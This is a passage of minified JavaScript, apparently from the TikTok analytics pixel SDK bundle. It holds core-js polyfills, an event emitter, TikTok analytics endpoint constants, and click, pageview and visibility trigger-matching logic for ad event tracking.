      }, t.prototype._rootContainsTarget = function (t) {
        return i(this.root || l, t);
      }, t.prototype._registerInstance = function () {
        e.indexOf(this) < 0 && e.push(this);
      }, t.prototype._unregisterInstance = function () {
        var t = e.indexOf(this);
        -1 != t && e.splice(t, 1);
      }, window.IntersectionObserver = t, window.IntersectionObserverEntry = u));
    }();
  },
  WuDU: function (t, e, n) {
    var u = n("hYRU"),
      s = n("pO6F"),
      f = n("89xZ"),
      l = n("kr2p").f,
      n = function (c) {
        return function (t) {
          for (var e, n = f(t), r = s(n), o = r.length, i = 0, a = []; i < o;) e = r[i++], u && !l.call(n, e) || a.push(c ? [e, n[e]] : n[e]);
          return a;
        };
      };
    t.exports = {
      entries: n(!0),
      values: n(!1)
    };
  },
  Wvzj: function (t, e, n) {
    var r = n("BMm0"),
      o = n("Xy12"),
      i = n("F9WQ");
    r({
      target: "Object",
      stat: !0,
      forced: n("TwxJ")(function () {
        i(1);
      })
    }, {
      keys: function (t) {
        return i(o(t));
      }
    });
  },
  XTFD: function (t, e, n) {
    "use strict";

    var r = n("BMm0"),
      o = n("OG+r"),
      i = n("Dk4y"),
      a = n("TwxJ"),
      c = n("0o+f"),
      u = n("tddt"),
      s = n("p/tk"),
      n = n("M/XQ");
    r({
      target: "Promise",
      proto: !0,
      real: !0,
      forced: !!i && a(function () {
        i.prototype.finally.call({
          then: function () {}
        }, function () {});
      })
    }, {
      finally: function (e) {
        var n = u(this, c("Promise")),
          t = "function" == typeof e;
        return this.then(t ? function (t) {
          return s(n, e()).then(function () {
            return t;
          });
        } : e, t ? function (t) {
          return s(n, e()).then(function () {
            throw t;
          });
        } : e);
      }
    }), o || "function" != typeof i || i.prototype.finally || n(i.prototype, "finally", c("Promise").prototype.finally);
  },
  Xp4F: function (t, e, n) {
    var r = n("eVlr");
    t.exports = function (t) {
      return Object(r(t));
    };
  },
  Xx11: function (t, e, n) {
    n = n("nJ5C");
    t.exports = /(?:iphone|ipod|ipad).*applewebkit/i.test(n);
  },
  Xy12: function (t, e, n) {
    var r = n("nGI6");
    t.exports = function (t) {
      return Object(r(t));
    };
  },
  YAV1: function (t, e) {
    t.exports = function (t) {
      return "object" == typeof t ? null !== t : "function" == typeof t;
    };
  },
  Yp42: function (t, e, n) {
    function r() {}
    function o(t) {
      return "<script>" + t + "</" + h + ">";
    }
    var i,
      a = n("uoAl"),
      c = n("JMA6"),
      u = n("mzWg"),
      s = n("iBW0"),
      f = n("dhZJ"),
      l = n("GgRh"),
      n = n("bQ5J"),
      p = "prototype",
      h = "script",
      d = n("IE_PROTO"),
      v = function () {
        try {
          i = document.domain && new ActiveXObject("htmlfile");
        } catch (t) {}
        var t;
        v = i ? function (t) {
          t.write(o("")), t.close();
          var e = t.parentWindow.Object;
          return t = null, e;
        }(i) : ((t = l("iframe")).style.display = "none", f.appendChild(t), t.src = String("javascript:"), (t = t.contentWindow.document).open(), t.write(o("document.F=Object")), t.close(), t.F);
        for (var e = u.length; e--;) delete v[p][u[e]];
        return v();
      };
    s[d] = !0, t.exports = Object.create || function (t, e) {
      var n;
      return null !== t ? (r[p] = a(t), n = new r(), r[p] = null, n[d] = t) : n = v(), void 0 === e ? n : c(n, e);
    };
  },
  ZFXO: function (t, e, n) {
    "use strict";

    n.d(e, "a", function () {
      return r;
    }), n.d(e, "b", function () {
      return o;
    }), n.d(e, "h", function () {
      return i;
    }), n.d(e, "q", function () {
      return a;
    }), n.d(e, "g", function () {
      return c;
    }), n.d(e, "c", function () {
      return u;
    }), n.d(e, "p", function () {
      return s;
    }), n.d(e, "f", function () {
      return f;
    }), n.d(e, "e", function () {
      return l;
    }), n.d(e, "d", function () {
      return p;
    }), n.d(e, "k", function () {
      return h;
    }), n.d(e, "n", function () {
      return d;
    }), n.d(e, "l", function () {
      return v;
    }), n.d(e, "j", function () {
      return y;
    }), n.d(e, "m", function () {
      return b;
    }), n.d(e, "i", function () {
      return g;
    }), n.d(e, "o", function () {
      return m;
    });
    var r = "tt_adInfo",
      o = "tt_appInfo",
      i = "pageId",
      a = "tt_sessionId",
      c = "messageId",
      u = "tt_pixel_event_has_reported_map",
      s = "tt_pixel_session_index",
      f = "ad_analytics_msg",
      l = "insight_log",
      p = "ad_analytics_msg",
      h = "https://analytics.tiktok.com/api/v2/pcm",
      d = "https://analytics.tiktok.com/api/v2/shopify_pixel",
      v = "https://analytics.tiktok.com/api/v2/performance",
      y = "https://analytics.tiktok.com/api/v2/interaction",
      b = "https://analytics.tiktok.com/api/v2/performance_interaction",
      g = "https://analytics.tiktok.com/api/v2/pixel/act",
      m = "https://analytics.tiktok.com/api/v2/pixel";
  },
  ZMju: function (t, e, n) {
    "use strict";

    var r = n("uoY4"),
      o = n("2gBf");
    t.exports = r ? {}.toString : function () {
      return "[object " + o(this) + "]";
    };
  },
  ZOq6: function (t, e, n) {
    "use strict";

    function d(t) {
      var e;
      return !(!O(t) || "function" != typeof (e = t.then)) && e;
    }
    function o(l, p) {
      var h;
      l.notified || (l.notified = !0, h = l.reactions, A(function () {
        for (var t = l.value, e = 1 == l.state, n = 0; h.length > n;) {
          var r,
            o,
            i,
            a = h[n++],
            c = e ? a.ok : a.fail,
            u = a.resolve,
            s = a.reject,
            f = a.domain;
          try {
            c ? (e || (2 === l.rejection && nt(l), l.rejection = 1), !0 === c ? r = t : (f && f.enter(), r = c(t), f && (f.exit(), i = !0)), r === a.promise ? s(G("Promise-chain cycle")) : (o = d(r)) ? o.call(r, u, s) : u(r)) : s(t);
          } catch (t) {
            f && !i && f.exit(), s(t);
          }
        }
        l.reactions = [], l.notified = !1, p && !l.rejection && tt(l);
      }));
    }
    function i(t, e, n) {
      var r, o;
      Z ? ((r = X.createEvent("Event")).promise = e, r.reason = n, r.initEvent(t, !1, !0), h.dispatchEvent(r)) : r = {
        promise: e,
        reason: n
      }, !Q && (o = h["on" + t]) ? o(r) : t === $ && N("Unhandled promise rejection", n);
    }
    function a(e, n, r) {
      return function (t) {
        e(n, t, r);
      };
    }
    function c(t, e, n) {
      t.done || (t.done = !0, (t = n ? n : t).value = e, t.state = 2, o(t, !0));
    }
    var r,
      u,
      s,
      f,
      l = n("BMm0"),
      p = n("OG+r"),
      h = n("5m5M"),
      v = n("0o+f"),
      y = n("Dk4y"),
      b = n("M/XQ"),
      g = n("Eizh"),
      m = n("HE2K"),
      _ = n("Id1e"),
      O = n("YAV1"),
      E = n("BxeX"),
      I = n("nt9l"),
      w = n("e75w"),
      x = n("JOA9"),
      S = n("gjK9"),
      P = n("tddt"),
      T = n("1hNH").set,
      A = n("Rw5A"),
      j = n("p/tk"),
      N = n("EVRM"),
      k = n("Lyt4"),
      R = n("2eF0"),
      M = n("fA08"),
      C = n("4oLS"),
      L = n("PpLa"),
      D = n("Io58"),
      F = n("kuLf"),
      B = L("species"),
      U = "Promise",
      V = M.get,
      J = M.set,
      H = M.getterFor(U),
      Y = y,
      G = h.TypeError,
      X = h.document,
      W = h.process,
      K = v("fetch"),
      z = k.f,
      q = z,
      Z = !!(X && X.createEvent && h.dispatchEvent),
      Q = "function" == typeof PromiseRejectionEvent,
      $ = "unhandledrejection",
      C = C(U, function () {
        if (!(w(Y) !== String(Y))) {
          if (66 === F) return !0;
          if (!D && !Q) return !0;
        }
        if (p && !Y.prototype.finally) return !0;
        if (51 <= F && /native code/.test(Y)) return !1;
        function t(t) {
          t(function () {}, function () {});
        }
        var e = Y.resolve(1);
        return (e.constructor = {})[B] = t, !(e.then(function () {}) instanceof t);
      }),
      S = C || !S(function (t) {
        Y.all(t).catch(function () {});
      }),
      tt = function (o) {
        T.call(h, function () {
          var t,
            e = o.facade,
            n = o.value,
            r = et(o);
          if (r && (t = R(function () {
            D ? W.emit("unhandledRejection", n, e) : i($, e, n);
          }), o.rejection = D || et(o) ? 2 : 1, t.error)) throw t.value;
        });
      },
      et = function (t) {
        return 1 !== t.rejection && !t.parent;
      },
      nt = function (e) {
        T.call(h, function () {
          var t = e.facade;
          D ? W.emit("rejectionHandled", t) : i("rejectionhandled", t, e.value);
        });
      },
      rt = function (n, t, e) {
        if (!n.done) {
          n.done = !0, e && (n = e);
          try {
            if (n.facade === t) throw G("Promise can't be resolved itself");
            var r = d(t);
            r ? A(function () {
              var e = {
                done: !1
              };
              try {
                r.call(t, a(rt, e, n), a(c, e, n));
              } catch (t) {
                c(e, t, n);
              }
            }) : (n.value = t, n.state = 1, o(n, !1));
          } catch (t) {
            c({
              done: !1
            }, t, n);
          }
        }
      };
    C && (Y = function (t) {
      I(this, Y, U), E(t), r.call(this);
      var e = V(this);
      try {
        t(a(rt, e), a(c, e));
      } catch (t) {
        c(e, t);
      }
    }, (r = function (t) {
      J(this, {
        type: U,
        done: !1,
        notified: !1,
        parent: !1,
        reactions: [],
        rejection: !1,
        state: 0,
        value: void 0
      });
    }).prototype = g(Y.prototype, {
      then: function (t, e) {
        var n = H(this),
          r = z(P(this, Y));
        return r.ok = "function" != typeof t || t, r.fail = "function" == typeof e && e, r.domain = D ? W.domain : void 0, n.parent = !0, n.reactions.push(r), 0 != n.state && o(n, !1), r.promise;
      },
      catch: function (t) {
        return this.then(void 0, t);
      }
    }), u = function () {
      var t = new r(),
        e = V(t);
      this.promise = t, this.resolve = a(rt, e), this.reject = a(c, e);
    }, k.f = z = function (t) {
      return t === Y || t === s ? new u() : q(t);
    }, p || "function" != typeof y || (f = y.prototype.then, b(y.prototype, "then", function (t, e) {
      var n = this;
      return new Y(function (t, e) {
        f.call(n, t, e);
      }).then(t, e);
    }, {
      unsafe: !0
    }), "function" == typeof K && l({
      global: !0,
      enumerable: !0,
      forced: !0
    }, {
      fetch: function (t) {
        return j(Y, K.apply(h, arguments));
      }
    }))), l({
      global: !0,
      wrap: !0,
      forced: C
    }, {
      Promise: Y
    }), m(Y, U, !1, !0), _(U), s = v(U), l({
      target: U,
      stat: !0,
      forced: C
    }, {
      reject: function (t) {
        var e = z(this);
        return e.reject.call(void 0, t), e.promise;
      }
    }), l({
      target: U,
      stat: !0,
      forced: p || C
    }, {
      resolve: function (t) {
        return j(p && this === s ? Y : this, t);
      }
    }), l({
      target: U,
      stat: !0,
      forced: S
    }, {
      all: function (t) {
        var c = this,
          e = z(c),
          u = e.resolve,
          s = e.reject,
          n = R(function () {
            var r = E(c.resolve),
              o = [],
              i = 0,
              a = 1;
            x(t, function (t) {
              var e = i++,
                n = !1;
              o.push(void 0), a++, r.call(c, t).then(function (t) {
                n || (n = !0, o[e] = t, --a || u(o));
              }, s);
            }), --a || u(o);
          });
        return n.error && s(n.value), e.promise;
      },
      race: function (t) {
        var n = this,
          r = z(n),
          o = r.reject,
          e = R(function () {
            var e = E(n.resolve);
            x(t, function (t) {
              e.call(n, t).then(r.resolve, o);
            });
          });
        return e.error && o(e.value), r.promise;
      }
    });
  },
  ZTm6: function (t, e) {
    t.exports = ["constructor", "hasOwnProperty", "isPrototypeOf", "propertyIsEnumerable", "toLocaleString", "toString", "valueOf"];
  },
  ZhPi: function (t, e, n) {
    var r = n("WkPL");
    t.exports = function (t, e) {
      if (t) {
        if ("string" == typeof t) return r(t, e);
        var n = Object.prototype.toString.call(t).slice(8, -1);
        return "Map" === (n = "Object" === n && t.constructor ? t.constructor.name : n) || "Set" === n ? Array.from(t) : "Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n) ? r(t, e) : void 0;
      }
    }, t.exports.default = t.exports, t.exports.__esModule = !0;
  },
  "a+yg": function (t, e, n) {
    var r = n("hBnJ");
    t.exports = function (t) {
      var e = t.return;
      if (void 0 !== e) return r(e.call(t)).value;
    };
  },
  aJVn: function (t, e, n) {
    var c = n("edxO"),
      u = n("wUKj"),
      s = n("1EXu"),
      f = n("jk77");
    t.exports = function (t, e) {
      for (var n = u(e), r = f.f, o = s.f, i = 0; i < n.length; i++) {
        var a = n[i];
        c(t, a) || r(t, a, o(e, a));
      }
    };
  },
  aN3i: function (t, e, n) {
    n("BMm0")({
      target: "Object",
      stat: !0
    }, {
      is: n("vj8M")
    });
  },
  ab8z: function (t, e, n) {
    var r = n("PpLa"),
      o = n("OwQu"),
      i = r("iterator"),
      a = Array.prototype;
    t.exports = function (t) {
      return void 0 !== t && (o.Array === t || a[i] === t);
    };
  },
  ah02: function (t, e, n) {
    "use strict";

    var r = n("tNbY"),
      o = n("hYRU"),
      i = n("ElIT"),
      a = n("Xp4F"),
      c = n("mb4w"),
      u = n("jk77");
    o && r({
      target: "Object",
      proto: !0,
      forced: i
    }, {
      __defineSetter__: function (t, e) {
        u.f(a(this), t, {
          set: c(e),
          enumerable: !0,
          configurable: !0
        });
      }
    });
  },
  amL5: function (t, e, n) {
    var r = n("BMm0"),
      o = n("pAXd");
    r({
      target: "Object",
      stat: !0,
      forced: !o,
      sham: !o
    }, {
      defineProperty: n("zr9T").f
    });
  },
  bQ5J: function (t, e, n) {
    var r = n("Thaq"),
      o = n("L5Il"),
      i = r("keys");
    t.exports = function (t) {
      return i[t] || (i[t] = o(t));
    };
  },
  blhV: function (t, e, n) {
    n("npvp")(Math, "Math", !0);
  },
  cKix: function (t, e, n) {
    var r = n("j16E"),
      o = n("VFIL");
    t.exports = function (e, n) {
      try {
        o(r, e, n);
      } catch (t) {
        r[e] = n;
      }
      return n;
    };
  },
  cpc2: function (t, e, n) {
    function r(t) {
      if (t) return function (t) {
        for (var e in r.prototype) t[e] = r.prototype[e];
        return t;
      }(t);
    }
    (t.exports = r).prototype.on = r.prototype.addEventListener = function (t, e) {
      return this._callbacks = this._callbacks || {}, (this._callbacks["$" + t] = this._callbacks["$" + t] || []).push(e), this;
    }, r.prototype.once = function (t, e) {
      function n() {
        this.off(t, n), e.apply(this, arguments);
      }
      return n.fn = e, this.on(t, n), this;
    }, r.prototype.off = r.prototype.removeListener = r.prototype.removeAllListeners = r.prototype.removeEventListener = function (t, e) {
      if (this._callbacks = this._callbacks || {}, 0 == arguments.length) return this._callbacks = {}, this;
      var n,
        r = this._callbacks["$" + t];
      if (!r) return this;
      if (1 == arguments.length) return delete this._callbacks["$" + t], this;
      for (var o = 0; o < r.length; o++) if ((n = r[o]) === e || n.fn === e) {
        r.splice(o, 1);
        break;
      }
      return 0 === r.length && delete this._callbacks["$" + t], this;
    }, r.prototype.emit = function (t) {
      this._callbacks = this._callbacks || {};
      for (var e = new Array(arguments.length - 1), n = this._callbacks["$" + t], r = 1; r < arguments.length; r++) e[r - 1] = arguments[r];
      if (n) for (var r = 0, o = (n = n.slice(0)).length; r < o; ++r) n[r].apply(this, e);
      return this;
    }, r.prototype.listeners = function (t) {
      return this._callbacks = this._callbacks || {}, this._callbacks["$" + t] || [];
    }, r.prototype.hasListeners = function (t) {
      return !!this.listeners(t).length;
    };
  },
  dEdv: function (t, e, n) {
    var r,
      o = n("5m5M"),
      i = n("yjU/"),
      a = n("2ugy"),
      c = n("g03b"),
      n = n("PpLa"),
      u = n("iterator"),
      s = n("toStringTag"),
      f = a.values;
    for (r in i) {
      var l = o[r],
        p = l && l.prototype;
      if (p) {
        if (p[u] !== f) try {
          c(p, u, f);
        } catch (t) {
          p[u] = f;
        }
        if (p[s] || c(p, s, r), i[r]) for (var h in a) if (p[h] !== a[h]) try {
          c(p, h, a[h]);
        } catch (t) {
          p[h] = a[h];
        }
      }
    }
  },
  dG4g: function (t, e, n) {
    var r = n("BMm0"),
      o = n("DQBI").values;
    r({
      target: "Object",
      stat: !0
    }, {
      values: function (t) {
        return o(t);
      }
    });
  },
  dhZJ: function (t, e, n) {
    n = n("Gd/C");
    t.exports = n("document", "documentElement");
  },
  dotx: function (t, e, n) {
    "use strict";

    var r = n("5BnI"),
      o = n("jk77"),
      i = n("ywqg");
    t.exports = function (t, e, n) {
      e = r(e);
      e in t ? o.f(t, e, i(0, n)) : t[e] = n;
    };
  },
  e75w: function (t, e, n) {
    var n = n("9Ezq"),
      r = Function.toString;
    "function" != typeof n.inspectSource && (n.inspectSource = function (t) {
      return r.call(t);
    }), t.exports = n.inspectSource;
  },
  "eKW+": function (t, e) {
    t.exports = !1;
  },
  eT3W: function (t, e, n) {
    var c = n("j16E"),
      u = n("VFIL"),
      s = n("edxO"),
      f = n("cKix"),
      r = n("ARxZ"),
      n = n("FgOo"),
      o = n.get,
      l = n.enforce,
      p = String(String).split("String");
    (t.exports = function (t, e, n, r) {
      var o = !!r && !!r.unsafe,
        i = !!r && !!r.enumerable,
        a = !!r && !!r.noTargetGet;
      "function" == typeof n && ("string" != typeof e || s(n, "name") || u(n, "name", e), (r = l(n)).source || (r.source = p.join("string" == typeof e ? e : ""))), t !== c ? (o ? !a && t[e] && (i = !0) : delete t[e], i ? t[e] = n : u(t, e, n)) : i ? t[e] = n : f(e, n);
    })(Function.prototype, "toString", function () {
      return "function" == typeof this && o(this).source || r(this);
    });
  },
  eVlr: function (t, e) {
    t.exports = function (t) {
      if (null == t) throw TypeError("Can't call method on " + t);
      return t;
    };
  },
  edxO: function (t, e, n) {
    var r = n("Xp4F"),
      o = {}.hasOwnProperty;
    t.exports = function (t, e) {
      return o.call(r(t), e);
    };
  },
  f2VU: function (t, e, n) {
    var r = n("tNbY"),
      o = n("WuDU").entries;
    r({
      target: "Object",
      stat: !0
    }, {
      entries: function (t) {
        return o(t);
      }
    });
  },
  fA08: function (t, e, n) {
    var r,
      o,
      i,
      a,
      c,
      u,
      s,
      f,
      l = n("P0wZ"),
      p = n("5m5M"),
      h = n("YAV1"),
      d = n("g03b"),
      v = n("oYVP"),
      y = n("9Ezq"),
      b = n("Aa16"),
      n = n("Al8F"),
      g = "Object already initialized",
      p = p.WeakMap;
    s = l ? (r = y.state || (y.state = new p()), o = r.get, i = r.has, a = r.set, c = function (t, e) {
      if (i.call(r, t)) throw new TypeError(g);
      return e.facade = t, a.call(r, t, e), e;
    }, u = function (t) {
      return o.call(r, t) || {};
    }, function (t) {
      return i.call(r, t);
    }) : (n[f = b("state")] = !0, c = function (t, e) {
      if (v(t, f)) throw new TypeError(g);
      return e.facade = t, d(t, f, e), e;
    }, u = function (t) {
      return v(t, f) ? t[f] : {};
    }, function (t) {
      return v(t, f);
    }), t.exports = {
      set: c,
      get: u,
      has: s,
      enforce: function (t) {
        return s(t) ? u(t) : c(t, {});
      },
      getterFor: function (n) {
        return function (t) {
          var e;
          if (!h(t) || (e = u(t)).type !== n) throw TypeError("Incompatible receiver, " + n + " required");
          return e;
        };
      }
    };
  },
  fKdN: function (t, e, n) {
    var r = n("tNbY"),
      o = n("hYRU"),
      u = n("wUKj"),
      s = n("89xZ"),
      f = n("1EXu"),
      l = n("dotx");
    r({
      target: "Object",
      stat: !0,
      sham: !o
    }, {
      getOwnPropertyDescriptors: function (t) {
        for (var e, n, r = s(t), o = f.f, i = u(r), a = {}, c = 0; i.length > c;) void 0 !== (n = o(r, e = i[c++])) && l(a, e, n);
        return a;
      }
    });
  },
  fe1q: function (t, e, n) {
    "use strict";

    n.d(e, "c", function () {
      return o;
    }), n.d(e, "a", function () {
      return i;
    }), n.d(e, "d", function () {
      return a;
    }), n.d(e, "b", function () {
      return c;
    });
    var r = n("SbFU");
    function o() {
      for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
      try {
        var n = Object(r.n)().monitor;
        n && n.info.apply(n, t);
      } catch (t) {}
    }
    function i() {
      for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
      try {
        var n = Object(r.n)().monitor;
        n && n.error.apply(n, t);
      } catch (t) {}
    }
    function a(t, e) {
      try {
        var n = Object(r.n)().diagnostics;
        n && n.warn.apply(n, [t, e]);
      } catch (t) {}
    }
    function c() {
      try {
        0;
        var t = document && document.currentScript,
          e = t && t.src || "http://emptyURLSrc",
          n = /i18n\/pixel\/events\.js/.test(e),
          r = /i18n\/pixel\/sdk\.js/.test(e),
          o = new URL(e).searchParams,
          i = o.get("sdkid") || t && t.getAttribute("data-id") || "";
        return n ? {
          lib: o.get("lib") || "ttq",
          pixelCode: i
        } : r ? {
          lib: "_taq",
          pixelCode: i
        } : {
          lib: "ttq",
          pixelCode: i
        };
      } catch (t) {
        return {
          lib: "ttq",
          pixelCode: ""
        };
      }
    }
  },
  freY: function (t, e, n) {
    "use strict";

    var p = n("hYRU"),
      r = n("g2s6"),
      h = n("pO6F"),
      d = n("Si2v"),
      v = n("kr2p"),
      y = n("Xp4F"),
      b = n("vcnZ"),
      o = Object.assign,
      i = Object.defineProperty;
    t.exports = !o || r(function () {
      if (p && 1 !== o({
        b: 1
      }, o(i({}, "a", {
        enumerable: !0,
        get: function () {
          i(this, "b", {
            value: 3,
            enumerable: !1
          });
        }
      }), {
        b: 2
      })).b) return !0;
      var t = {},
        e = {},
        n = Symbol(),
        r = "abcdefghijklmnopqrst";
      return t[n] = 7, r.split("").forEach(function (t) {
        e[t] = t;
      }), 7 != o({}, t)[n] || h(o({}, e)).join("") != r;
    }) ? function (t, e) {
      for (var n = y(t), r = arguments.length, o = 1, i = d.f, a = v.f; o < r;) for (var c, u = b(arguments[o++]), s = i ? h(u).concat(i(u)) : h(u), f = s.length, l = 0; l < f;) c = s[l++], p && !a.call(u, c) || (n[c] = u[c]);
      return n;
    } : o;
  },
  g03b: function (t, e, n) {
    var r = n("pAXd"),
      o = n("zr9T"),
      i = n("KvEl");
    t.exports = r ? function (t, e, n) {
      return o.f(t, e, i(1, n));
    } : function (t, e, n) {
      return t[e] = n, t;
    };
  },
  g2s6: function (t, e) {
    t.exports = function (t) {
      try {
        return !!t();
      } catch (t) {
        return !0;
      }
    };
  },
  "gik+": function (t, e, n) {
    "use strict";

    n.r(e);
    n("V96E"), n("jg4D"), n("U3M1"), n("Wr5T");
    var c,
      _ = n("SbFU"),
      O = n("fe1q"),
      E = n("/6w+"),
      i = ["", "webkit", "Moz", "MS", "ms", "o"],
      r = window,
      o = void 0 !== function (t, e) {
        var n,
          r = e[0].toUpperCase() + e.slice(1),
          o = 0;
        for (; o < i.length;) {
          if ((n = (n = i[o]) ? n + r : e) in t) return t[n];
          o++;
        }
        return;
      }(r, "PointerEvent"),
      u = "ontouchstart" in r;
    (m = c = c || {})[m.Default = 0] = "Default", m[m.Start = 1] = "Start", m[m.Move = 2] = "Move", m[m.End = 4] = "End", m[m.Cancle = 8] = "Cancle";
    var s = {
      pointer: {
        events: ["pointerdown", "pointermove", "pointerup", "pointercancel"],
        handler: function (t) {
          var e = t.type,
            n = {
              status: c.Default,
              timestamp: Date.now(),
              position: [t.clientX, t.clientY]
            };
          return e !== this.events[0] || 0 !== t.button && "touch" !== t.pointerType ? e === this.events[1] ? n.status = c.Move : e === this.events[2] ? n.status = c.End : e === this.events[3] && (n.status = c.Cancle) : n.status = c.Start, n;
        }
      },
      touch: {
        events: ["touchstart", "touchmove", "touchend", "touchcancel"],
        handler: function (t) {
          var e = t.type;
          if (1 !== t.changedTouches.length) return null;
          t = {
            status: c.Default,
            timestamp: Date.now(),
            position: [t.changedTouches[0].clientX, t.changedTouches[0].clientY]
          };
          return e === this.events[0] ? t.status = c.Start : e === this.events[1] ? t.status = c.Move : e === this.events[2] ? t.status = c.End : e === this.events[3] && (t.status = c.Cancle), t.status === c.Default ? null : t;
        }
      },
      mouse: {
        events: ["mousedown", "mousemove", "mouseup"],
        handler: function (t) {
          var e = t.type,
            n = {
              status: c.Default,
              timestamp: Date.now(),
              position: [t.clientX, t.clientY]
            };
          return e === this.events[0] && 0 === t.button ? n.status = c.Start : e === this.events[1] ? n.status = c.Move : e === this.events[2] && (n.status = c.End), n.status & c.Move && 1 !== t.which && (n.status = c.End), n.status === c.Default ? null : n;
        }
      }
    };
    "MSPointerEvent" in r && !("PointerEvent" in r) && (s.pointer.events = ["MSPointerDown", "MSPointerMove", "MSPointerUp", "MSPointerCancel"]);
    var f = 250,
      l = 9;
    function p(t, e, n) {
      for (var r = 0; r < t.length; r++) document.addEventListener(t[r], e, n);
    }
    function h(t, e, n) {
      for (var r in document.querySelectorAll(e)) if (n) {
        if (Object.is(r, t)) return 1;
      } else if (!Object.is(r, t)) return 1;
    }
    function I(t) {
      var e = document.createRange(),
        n = document.body || document.head;
      e.selectNode(n), t = e.createContextualFragment(t), n.appendChild(t);
    }
    function d(t, e, n) {
      var r,
        o,
        i = (r = {}, o = new Promise(function (t, e) {
          r.resolve = t, r.reject = e;
        }), r.promise = o, r);
      return new IntersectionObserver(function (t) {
        t.forEach(function (t) {
          t.isIntersecting && (t = {
            result: t.isIntersecting,
            curValue: e,
            condition: n
          }, i.resolve(t));
        });
      }, {
        root: null,
        rootMargin: "0px",
        threshold: .5
      }).observe(t), i.promise;
    }
    var a = function (a, t) {
      function e(n) {
        var r, o, i;
        return function (t) {
          var e = s[n].handler(t);
          if (null !== e) {
            if (e.status & c.Start) return r = c.Start, o = e.timestamp, i = e.position, void t.target;
            if (e.status & c.End) r & c.Start && e.timestamp - o < f && Math.sqrt(Math.pow(e.position[0] - i[0], 2) + Math.pow(e.position[1] - i[1], 2)) < l && a(t);else if (e.status & c.Move && r & c.Start) return;
          }
          i = [o = r = 0, 0], 0;
        };
      }
      o ? p(s.pointer.events, e("pointer"), t) : u ? p(s.touch.events, e("touch"), t) : p(s.mouse.events, e("mouse"), t);
    };
    function v(t, e) {
      var n = history[t],
        r = t + "-" + e;
      return function () {
        n.apply(history, arguments);
        var t = new CustomEvent(r, {
          detail: arguments
        });
        window.dispatchEvent(t);
      };
    }
    function y(e, t) {
      try {
        var n = new URL(e);
        return n.searchParams.delete(t), n.toString();
      } catch (t) {
        return e;
      }
    }
    var w = '"pixelMethod":"standard"';
    String.prototype.startsWith || Object.defineProperty(String.prototype, "startsWith", {
      value: function (t, e) {
        return this.substring(e = !e || e < 0 ? 0 : +e, e + t.length) === t;
      }
    }), String.prototype.endsWith || (String.prototype.endsWith = function (t, e) {
      return (void 0 === e || e > this.length) && (e = this.length), this.substring(e - t.length, e) === t;
    });
    function x(e, t, n, r) {
      switch (t) {
        case "EQUALS":
          if ("ELEMENT" == r) try {
            for (var o = document.querySelectorAll(n), i = Array.prototype.slice.call(o), a = 0; a < i.length; a++) if (i[a].contains(e)) return !0;
          } catch (t) {
            return !1;
          }
          if (0 < n.split(";").filter(function (t) {
            return e == t;
          }).length) return !0;
          break;
        case "LT":
          if (e < n) return !0;
          break;
        case "GT":
          if (n < e) return !0;
          break;
        case "LT_OR_EQUAL":
          if (e <= n) return !0;
          break;
        case "GT_OR_EQUAL":
          if (n <= e) return !0;
          break;
        case "CONTAINS":
          if (0 < n.split(";").filter(function (t) {
            return -1 < e.indexOf(t);
          }).length) return !0;
          break;
        case "DOES_NOT_EQUAL":
          if (0 == n.split(";").filter(function (t) {
            return e == t;
          }).length) return !0;
          break;
        case "DOES_NOT_CONTAIN":
          if (-1 == e.indexOf(n)) return !0;
          break;
        case "STARTS_WITH":
          if (e.startsWith(n)) return !0;
          break;
        case "ENDS_WITH":
          if (e.endsWith(n)) return !0;
          break;
        case "MATCHES_REGEX":
          if (n.test(e)) return !0;
          break;
        case "MATCHES_REGEX_IGNORE_CASE":
          if (!n.test(e)) return !0;
          break;
        case "MATCHES_CSS_SELECTOR":
          if (h(e, n, !0)) return !0;
          break;
        case "DOSE_NOT_MATCHES_CSS_SELECTOR":
          if (h(e, n, !1)) return !0;
      }
      return !1;
    }
    var b = function (t) {
        var e = "function" == typeof Symbol && Symbol.iterator,
          n = e && t[e],
          r = 0;
        if (n) return n.call(t);
        if (t && "number" == typeof t.length) return {
          next: function () {
            return {
              value: (t = t && r >= t.length ? void 0 : t) && t[r++],
              done: !t
            };
          }
        };
        throw new TypeError(e ? "Object is not iterable." : "Symbol.iterator is not defined.");
      },
      g = {
        click: ["ELEMENT", "ELEMENT_CLASSES", "ELEMENT_ID", "ELEMENT_TARGET", "ElEMENT_URL", "ELEMENT_TEXT"],
        pageview: ["PAGE_URL", "PAGE_HOSTNAME", "PAGE_PATH", "REFERRER"],
        visibility: ["ELEMENT", "ELEMENT_CLASSES", "ELEMENT_ID"],
        history_change: ["NEW_HISTORY_FRAGMENT", "OLD_HISTORY_FRAGMENT", "NEW_HISTORY_STATE", "OLD_HISTORY_STATE", "HISTORY_SOURCE"]
      },
      m = (S.prototype.dispatcher = function (t, e, n, r, o) {
        var i, a;
        void 0 === o && (o = document);
        var c = e.variable_type,
          t = "visibility" == t ? ["pageview", "history_change", "visibility"] : ["pageview", "history_change", "click"];
        try {
          for (var u = b(t), s = u.next(); !s.done; s = u.next()) {
            var f = s.value;
            if (-1 < g[f].indexOf(c)) {
              var l = void 0;
              switch (f) {
                case "click":
                  l = this.click(c, n);
                  break;
                case "pageview":
                  l = this.pageview(c);
                  break;
                case "history_change":
                  l = this.history_change(c, n, r);
                  break;
                case "visibility":
                  l = this.visibility(c, e.value, o);
              }
              return l;
            }
          }
        } catch (t) {
          i = {
            error: t
          };
        } finally {
          try {
            s && !s.done && (a = u.return) && a.call(u);
          } finally {
            if (i) throw i.error;
          }
        }
      }, S.prototype.click = function (t, e) {
        var n;
        if (!e) return !1;
        switch (t) {
          case "ELEMENT":
            n = e.target;
            break;
          case "ELEMENT_CLASSES":
            n = e.target.className;
          case "ELEMENT_ID":
            n = e.target.id;
            break;
          case "ELEMENT_TARGET":
            n = e.target;
            break;
          case "ElEMENT_URL":
            n = e.target.href || e.target.src || "";
            break;
          case "ELEMENT_TEXT":
            n = e.target.text || "";
            break;
          default:
            n = null;
        }
        return n;
      }, S.prototype.pageview = function (t) {
        var e;
        switch (t) {
          case "PAGE_URL":
            e = y(location.href, "ttclid");
            break;
          case "PAGE_HOSTNAME":
            e = location.hostname;
            break;
          case "PAGE_PATH":
            e = location.pathname;
            break;
          case "REFERRER":
            e = y(document.referrer, "ttclid");
            break;
          default:
            e = null;
        }
        return e;
